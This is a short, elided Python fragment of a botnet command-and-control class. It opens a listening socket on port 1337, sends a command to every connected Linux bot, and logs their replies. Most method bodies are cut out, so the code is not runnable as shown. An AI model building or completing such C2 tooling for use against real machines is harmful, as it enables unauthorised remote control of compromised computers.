...
class BotnetCmdCtrl:
	...
	def create_server_socket(self):
		...
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			PORT = 1337														# Port number to allow incoming connections.
			IP = "172.17.0.1"												# IP of server.
	...
	def send_cmd_all(self, command):
		...
		for i in range(0, self.linux_count):					# Create for-loop that will depend on the number of Linux connections we have.
			self.sock.send(command)								# Use the already created socket connection.
			response = self.sock.recv(10000).decode('utf-8')	# Store response received from executed command.
			self.write_response_output(response)				# Write response to file. 
